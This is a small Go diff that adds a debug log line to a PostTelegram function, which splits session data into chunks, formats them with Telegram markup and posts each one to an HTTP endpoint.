@@ -172,6 +172,8 @@ func PostTelegram(env *SessionData) bool {
 	chunks := Split(data, 4000)
 
 	for _, chunk := range chunks {
+		log.Printf("Formatted chunk: %s", Format(chunk, TelegramBold, TelegramItalics, TelegramSuperscript))
+
 		buffer := bytes.NewBuffer(Format(chunk, TelegramBold, TelegramItalics, TelegramSuperscript))
 		_, err = http.Post(endpoint, header, buffer)
 		if err != nil {
